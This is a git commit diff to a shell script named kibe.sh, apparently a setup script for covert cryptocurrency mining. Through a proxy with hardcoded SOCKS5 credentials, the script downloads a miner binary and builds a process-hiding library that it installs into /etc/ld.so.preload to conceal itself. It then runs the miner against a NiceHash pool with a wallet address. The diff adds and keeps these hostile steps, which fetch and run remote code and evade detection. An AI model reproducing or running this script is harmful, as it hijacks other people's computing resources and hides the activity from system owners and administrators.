f0463623e4afab1ef6b40eeddd61177aa4f778a8
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-05-08 19:02:18 +0700

    Update kibe.sh

--- kibe.sh
+++ kibe.sh
@@ -2,7 +2,7 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -11,10 +11,11 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 154.92.127.178:5837
+socks5 = 209.127.183.130:8228
 socks5_username = lebarankita
 socks5_password = buatTHRan
 END
+
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
@@ -34,7 +35,7 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/githuboneheart/-/main/views/bezzHash
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
@@ -43,4 +44,6 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:3353 --user 3PbuXfuwVE4T2uGMFdfvzZJPCLnh9gB9cV.RAISHA
+
+
+./graftcp/graftcp ./bezzHash --url=ssl://3PbuXfuwVE4T2uGMFdfvzZJPCLnh9gB9cV@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
